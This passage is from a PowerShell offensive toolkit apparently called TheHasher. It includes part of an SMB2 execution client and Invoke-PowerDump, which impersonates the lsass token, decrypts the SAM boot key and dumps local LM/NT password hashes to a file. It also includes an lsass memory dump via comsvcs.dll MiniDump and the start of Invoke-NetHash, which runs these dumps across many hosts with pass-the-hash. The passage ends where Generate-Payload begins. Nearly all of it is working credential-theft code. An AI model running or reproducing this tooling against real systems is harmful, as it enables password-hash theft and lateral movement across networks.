                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }
                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }
                            
                        }

                        'TreeDisconnect'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header (([Byte]('0x'+'04')),([Byte]('0x'+'00'))) (([Byte]('0x'+'01')),([Byte]('0x'+'00'))) $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }
    
                    }
                
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }
        
        }

    }

    if($inveigh_session -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $message_ID
        $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$inveigh_session -or $Logoff)
    {
        $client.Close()
        $client_stream.Close()
    }

}

}




# PrivCheck überarbeiten
# Service Konten? 
# C# Code rauswerfen 

function global:Invoke-PowerDump
{
param (
    [Parameter()][bool]$fileoutput = $true
)

$sign = @"
using System;
using System.Runtime.InteropServices;
public static class priv
{
    [DllImport("shell32.dll")]
    public static extern bool IsUserAnAdmin();
}
"@
    $adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru
    function ElevatePrivs
    {
$signature = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
     public struct TokPriv1Luid 
     { 
         public int Count; 
         public long Luid; 
         public int Attr; 
     } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
      TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID 
    { 
      public UInt32 LowPart; 
      public UInt32 HighPart; 
    } 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID_AND_ATTRIBUTES { 
       public LUID Luid; 
       public UInt32 Attributes; 
    } 
 
 
    public struct TOKEN_PRIVILEGES { 
      public UInt32 PrivilegeCount; 
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
      public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken( 
      IntPtr PHThread, 
      IntPtr Token 
    ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     [return: MarshalAs(UnmanagedType.Bool)] 
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
       UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
    public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
"@ 
 
          $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
          if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
            Write-Warning "Run the Command as an Administrator" 
            Break 
          } 
 
          Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
          $adjPriv = [AdjPriv.AdjPriv] 
          [long]$luid = 0 
 
          $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
          $tokPriv1Luid.Count = 1 
          $tokPriv1Luid.Luid = $luid 
          $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
 
          $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
  
          [IntPtr]$htoken = [IntPtr]::Zero 
          $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
   
   
          $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
          $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
 
          if(-not($retVal)) { 
            [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
            Break 
          } 
 
          $process = (Get-Process -Name lsass) 
          #$process.name
          [IntPtr]$hlsasstoken = [IntPtr]::Zero 
          $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
 
          [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
          $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
  
          $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
  
          if(-not($retVal)) { 
            [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
          } 
      }
      function LoadApi
        {
        $oldErrorAction = $global:ErrorActionPreference;
        $global:ErrorActionPreference = "SilentlyContinue";
        $test = [PowerDump.Native];
        $global:ErrorActionPreference = $oldErrorAction;
        if ($test) 
        {
            # already loaded
            return; 
        }
$code = @"
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);
    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);
    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);
        }
    } // end namespace PowerDump
    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
"@
           $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
           $dllName = [PsObject].Assembly.Location
           $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
           $assemblies = @("System.dll", $dllName)
           $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
           $compilerParameters.GenerateInMemory = $true
           $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
           if($compilerResults.Errors.Count -gt 0) {
             $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
           }
        }
        $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
        $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
        $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
        $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
        $odd_parity = @(
          1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
          16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
          32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
          49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
          64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
          81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
          97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
          112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
          128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
          145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
          161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
          176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
          193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
          208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
          224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
          241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
        );
        function sid_to_key($sid)
        {
            $s1 = @();
            $s1 += [char]($sid -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
            $s1 += $s1[0];
            $s1 += $s1[1];
            $s1 += $s1[2];
            $s2 = @();
            $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
            $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
            return ,((str_to_key $s1),(str_to_key $s2));
        }
        function str_to_key($s)
        {
            $key = @();
            $key += [Shift]::Right([int]($s[0]), 1 );
            $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
            $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
            $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
            $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
            $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
            $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
            $key += $([int]($s[6]) -band 0x7F);
            0..7 | %{
                $key[$_] = [Shift]::Left($key[$_], 1);
                $key[$_] = $odd_parity[$key[$_]];
                }
            return ,$key;
        }
        function NewRC4([byte[]]$key)
        {
            return new-object Object |
            Add-Member NoteProperty key $key -PassThru |
            Add-Member NoteProperty S $null -PassThru |
            Add-Member ScriptMethod init {
                if (-not $this.S)
                {
                    [byte[]]$this.S = 0..255;
                    0..255 | % -begin{[long]$j=0;}{
                        $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                        $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                        }
                }
            } -PassThru |
            Add-Member ScriptMethod "encrypt" {
                $data = $args[0];
                $this.init();
                $outbuf = new-object byte[] $($data.Length);
                $S2 = $this.S[0..$this.S.Length];
                0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
                    $i = ($i+1) % $S2.Length;
                    $j = ($j + $S2[$i]) % $S2.Length;
                    $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
                    $a = $data[$_];
                    $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
                    $outbuf[$_] = ($a -bxor $b);
                }
                return ,$outbuf;
            } -PassThru
        }
        function des_encrypt([byte[]]$data, [byte[]]$key)
        {
            return ,(des_transform $data $key $true)
        }
        function des_decrypt([byte[]]$data, [byte[]]$key)
        {
            return ,(des_transform $data $key $false)
        }
        function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
        {
            $des = new-object Security.Cryptography.DESCryptoServiceProvider;
            $des.Mode = [Security.Cryptography.CipherMode]::ECB;
            $des.Padding = [Security.Cryptography.PaddingMode]::None;
            $des.Key = $key;
            $des.IV = $key;
            $transform = $null;
            if ($doEncrypt) {$transform = $des.CreateEncryptor();}
            else{$transform = $des.CreateDecryptor();}
            $result = $transform.TransformFinalBlock($data, 0, $data.Length);
            return ,$result;
        }
        function Decrypt-AES 
        {
        <#
        .SYNOPSIS

        Helper that to decrypt an AES blob.

        Used to decrypt LSA secret with temp key.
        #>
            [CmdletBinding()]
            Param(
                [Parameter()]
                [Byte[]]
                $Key,

                [Parameter()]
                [Byte[]]
                $CipherText,

                [Parameter()]
                [Byte[]]
                $InitializationVector = @(0) * 16,

                [Parameter()]
                [String]
                $PaddingMode = "Zeros"
            )

            $AES = New-Object System.Security.Cryptography.RijndaelManaged
            $AES.Key = $Key 
            $AES.IV = $InitializationVector
            $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $AES.Padding = [System.Security.Cryptography.PaddingMode]::$PaddingMode
            $AES.BlockSize = 128
            $Transform = $AES.CreateDecryptor()
            $Chunks = [Math]::Ceiling($CipherText.Length / 16)

            $Plaintext = @()

            try {
                for($i=0; $i -lt $Chunks; $i++) {
                    $Offset = $i*16;
                    $Chunk = $CipherText[$Offset..($Offset+15)]
                    try {
                        $Plaintext += $Transform.TransformFinalBlock($Chunk, 0, $Chunk.Count)
                    }
                    catch {
                        Write-Warning "Error transforming block: $_"
                    }
                }
                $Plaintext
            }
            catch {
                $_
            }

            try {
                $Transform.Dispose()
                $AES.Dispose()
            }
            catch {}
        }
        function Get-RegKeyClass([string]$key, [string]$subkey)
        {
            switch ($Key) {
                "HKCR" { $nKey = 0x80000000} #HK Classes Root
                "HKCU" { $nKey = 0x80000001} #HK Current User
                "HKLM" { $nKey = 0x80000002} #HK Local Machine
                "HKU"  { $nKey = 0x80000003} #HK Users
                "HKCC" { $nKey = 0x80000005} #HK Current Config
                default { 
                    throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
                }
            }
            $KEYQUERYVALUE = 0x1;
            $KEYREAD = 0x19;
            $KEYALLACCESS = 0x3F;
            $result = "";
            [int]$hkey=0
            if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
            {
                $classVal = New-Object Text.Stringbuilder 1024
                [int]$len = 1024
                if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
                    [ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
                {
                    $result = $classVal.ToString()
                }
                else
                {
                    Write-Error "RegQueryInfoKey failed";
                }   
                [PowerDump.Native]::RegCloseKey($hkey) | Out-Null
            }
            else
            {
                Write-Error "Cannot open key";
            }
            return $result;
        }
        function Get-BootKey
        {
            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
            $b = new-object byte[] $($s.Length/2);
            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
            $b2 = new-object byte[] 16;
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
            return ,$b2;
        }
        function Get-HBootKey
        {
            param([byte[]]$bootkey);
            $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
            $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
            $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
            if (-not $k) {return $null}
            [byte[]]$F = $k.GetValue("F");
            if (-not $F) {return $null}
            elseif($F[0] -eq "3")
                {
                [Byte[]]$Sys_IV = $F[0x78..0x87]
                [Byte[]]$EncSysKey = $F[0x88..0xA7]
                return, (Decrypt-AES -Key $Bootkey -CipherText $EncSysKey -InitializationVector $Sys_IV)
                }
            else
                {
                $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
                $rc4 = NewRC4 $rc4key;
                return ,($rc4.encrypt($F[0x80..0x9F]));
                }

        }
        function Get-UserName([byte[]]$V)
        {
            if (-not $V) {return $null};
            $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
            $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
            return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
        }
        function Get-UserHashes($u, [byte[]]$hbootkey)
        {
            [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
            
            # check if hashes exist (if byte memory equals to 20, then we've got a hash)
            $LM_exists = $false;
            $NT_exists = $false;
            # LM header check
            if ($u.V[0xa0..0xa3] -eq 20)
            {
                $LM_exists = $true;
            }
            # NT header check
            elseif ($u.V[0xac..0xaf] -eq 20)
            {
                $NT_exists = $true;
                $NT_NewStructure = $False
            }
            elseif ($u.V[0xac..0xaf] -eq 56)
            {
                $NT_exists = $true;
                $NT_NewStructure = $True
            }
        
            if ($LM_exists -eq $true)
            {
                $lm_hash_offset = $u.HashOffset + 4;
                $nt_hash_offset = $u.HashOffset + 8 + 0x10;
                $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
                $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
            }
        	
            elseif ($NT_exists -eq $true -and $NT_NewStructure -eq $False)
            {
                $nt_hash_offset = $u.HashOffset + 8;
                $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
            }
            elseif ($NT_exists -eq $true -and $NT_NewStructure -eq $True)
            {
                $nt_hash_offset = $u.HashOffset + 8 + 0x10;
                $aes_enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset+24)..$($nt_hash_offset+55)];
                $aes_nt_hash_iv =  [byte[]]$u.V[$($nt_hash_offset+8)..$($nt_hash_offset+23)];
                $enc_nt_hash =Decrypt-AES -Key $hbootkey[0..15] -CipherText $aes_enc_nt_hash -InitializationVector  $aes_nt_hash_iv
            }
            return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $NT_NewStructure);
        }
        function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey, $NT_NewStruc=$false)
        {
            [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
            
            # LM Hash
            if ($enc_lm_hash)
            {    
                $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword $NT_NewStruc;
            }
    
            # NT Hash
            if ($enc_nt_hash -and $NT_NewStruc -eq $false)
            {
                $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword $NT_NewStruc;
            }

            if ($enc_nt_hash -and $NT_NewStruc -eq $true)
            {
                $nthash = DecryptSingleHash $u.Rid $hbootkey[0..15] $enc_nt_hash[0..15] $antpassword $NT_NewStruc;
            }
            return ,($lmhash,$nthash)
        }
        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr, $NT_NewStru=$false)
        {
           
            $deskeys = sid_to_key $rid;
            $md5 = [Security.Cryptography.MD5]::Create();
            $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
            $rc4 = NewRC4 $rc4_key;
            if($NT_NewStru -eq $false)
                {
                $obfkey = $rc4.encrypt($enc_hash);
                }
            elseif($NT_NewStru -eq $true)
                {
                $obfkey = $enc_hash;
                }
            
            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + 
                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
            return ,$hash;
        }
        function Get-UserKeys
        {
            ls HKLM:\SAM\SAM\Domains\Account\Users | 
                where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
                    Add-Member AliasProperty KeyName PSChildName -PassThru |
                    Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                    Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
                    Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
                    Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
        }
        function Get-Values
        {
            LoadApi
            $bootkey = Get-BootKey;
            $hbootKey = Get-HBootKey $bootkey;
            Get-UserKeys | %{
                $values = Get-UserHashes $_ $hBootKey;
                "{0}:{1}:{2}::::" -f ($_.UserName,$_.Rid, 
                    [BitConverter]::ToString($values[1]).Replace("-","").ToLower(), 
                    [BitConverter]::ToString($values[0]).Replace("-","").ToLower());
            }
        }
        if ([priv]::IsUserAnAdmin())
        {
            if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
            {
                if($fileoutput -eq $true)
                    {
                    $Output = $null
                    $Output = Get-values

                    $Output | Out-File -FilePath ($env:windir + "\" + $env:COMPUTERNAME + "-" + (Get-Date -Format yyyyMMdd-hhmmss).tostring() + "TheHasher.txt")
                    }
                else
                    {
                    $Output = $null
                    $Output = Get-values

                    return $Output 
                    }
                
            }
            else
            {
                ElevatePrivs
                if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
                {
                if($fileoutput -eq $true)
                    {
                    $Output = $null
                    $Output = Get-values

                    $Output | Out-File -FilePath ($env:windir + "\" + $env:COMPUTERNAME + "-" + (Get-Date -Format yyyyMMdd-hhmmss).tostring() + "TheHasher.txt")
                    }
                else
                    {
                    $Output = $null
                    $Output = Get-values

                    return $Output 
                    }
                }
            }
        }
        else
        {
            Write-Error "Administrator or System privileges necessary."
        }
}



function global:Get-FilenameDialog {
    Add-Type -AssemblyName System.Windows.Forms
    $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = "C:\" }
    $null = $FileBrowser.ShowDialog()
    return $FileBrowser.Filename
}

function global:Invoke-LSADump
    {
        rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id ($env:windir + "\" + $env:COMPUTERNAME + "-" + (Get-Date -Format yyyyMMdd-hhmmss).tostring() + "TheHasher.bin") full
    }


Function Invoke-NetHash
{
<#
.SYNOPSIS
Invoke-NetHash provides the possability to execute an Secretsdump like command execution on a range of hosts (by use of Invoke-SMBExec). Further it also could be used to collect LSA Dumps from a Client range. Next to the build in functions also custom commands can be used.

Author: Sebastian Hoelzle 
License: BSD 3-Clause

.PARAMETER ActiveDirectory

Can be set to $true to enable gathering of the targets from Active Directory 
Please note: In case this will be set to $true and no additional limitation applied all computers will be targeted

.PARAMETER ComputerDomain

If sourcing is set to $true - required if sourcing need to be done in separate computer domain. If this parameter is not set and sourcing in the Active Directory is set to $true the domain of the current computer is used.

.PARAMETER UserDomain

Required if PtH is happening with a domain account.

.PARAMETER Filter

Custom LDAP Filter for sourcing within the Active Directory. If not set and sourcing is set to Active Directory the filter "(&(objectclass=Computer)(useraccountcontrol=4096))" is used.

.PARAMETER GC

In a multi-domain enviroment a separate Global Catalog can be provided if the sourcing in Active Directory is used 

.PARAMETER Filebased

If set to $true a file selection dialog will be opened to select the inputfile. The targets within the file need to be separated by ";".

.PARAMETER Inputfile

Parameter to provide path (full path required) to inputfile which contains targets. The targets within the file need to be separated by ";".

.PARAMETER Hosts

Parameter can be set to IP or Hostname of single host or multiple hosts. In case of multiple targets an array object is required.

.PARAMETER Username

Username for PtH - Please note the domain need to be provided by the Parameter "UserDomain". In case of local users no Userdomain is required.

.PARAMETER Hash

NT Hash of the user used for PtH

.PARAMETER BackChannel

Parameter to verfiy if result need to be transferred back. Default set to $true and required for the build in commands.

.PARAMETER Command

Parameter for custom commands 

.PARAMETER WriteVerbose

Parameter for increasing the verbosity of the script. Default set to $false

.PARAMETER Threads

Parameter to control how many threads are used for the job execution - default set to 2.
Please note: Don´t get crazy with this parameter - big ranges will take time anyway - better slow and steady as fast and crashed.

.PARAMETER WriteLog

Parameter to indicated if a log file will be written - Default set to $false

.PARAMETER LSADump

Parameter to indicate if an Dump of the LSA process will be created - Default set to $false
Please note: If this is set to $true - the BackChannel parameter need also be set to $true

.PARAMETER PowerDump

Parameter to indicate if the Powershell Version of Secretsdump - PowerDump will be executed - Default set to $false.
Please note: If this is set to $true - the BackChannel parameter need also be set to $true.

.EXAMPLE
Execute a command.
Invoke-NetHash -Hosts Client01 -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -Powerdump $true -BackChannel $true

.LINK
https://github.com/powerpointken/hasher

#>
[CmdletBinding()]
param (
    [Parameter()][bool]$ActiveDirectory,
    [Parameter()][string]$ComputerDomain,
    [Parameter()][string]$UserDomain,
    [Parameter()][string]$Filter,
    [Parameter()][bool]$GC,
    [Parameter()][bool]$Filebased,
    [Parameter()][string]$Inputfile,
    [Parameter()][string]$Hosts,
    [Parameter()][string]$Username,
    [Parameter()][string]$Hash,
    [Parameter()][bool]$BackChannel=$true,
    [Parameter()][string]$Command,
    [Parameter()][bool]$WriteVerbose=$false,
    [Parameter()][string]$Threads = 2,
    [Parameter()][bool]$WriteLog =$false,
    [Parameter()][bool]$LSADump =$false, 
    [Parameter()][bool]$PowerDump=$false    
    #[Parameter()][TypeName]$ParameterName
)

if($WriteVerbose -eq $true)
    {
    $VerbosePreference = "Continue"
    }
else 
    {
    $VerbosePreference = "SilentlyContinue"
    }




$Scriptlog = "TheHasher" + ((Get-Date -Format yyyyMMdd-hhmmss).tostring()) + ".txt"

$Version = "0.6"
Function Write-Log
    {
    param($Result, $Message, $ScriptLog, $LogSource, $AddInformation,$Log)
    $Scriptlogpath = $env:TEMP
    if($Log -eq $true)
        {
            $Logentry = (Get-Date -Format o) + "   " + $Result + " || " + $Message + " || " + $AddInformation + " || " + $LogSource
            $Logentry | Out-File ($Scriptlogpath + "\" + $ScriptLog) -Append
            $Logentry = "---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
            $Logentry| Out-File ($Scriptlogpath + "\" + $ScriptLog) -Append
        }
    }
  
Write-Log -Log $WriteLog  -Result "Started" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
$Start = Get-date

Write-Log -Log $WriteLog  -Result "Started" -Message "The functions will be initilized." -ScriptLog $Scriptlog -LogSource "Function Initilization"
Write-Verbose -Message "Script started in Version $Version"
function Generate-Payload
    {
        param (
        $functionToCall,
        $PayDirectory
        )
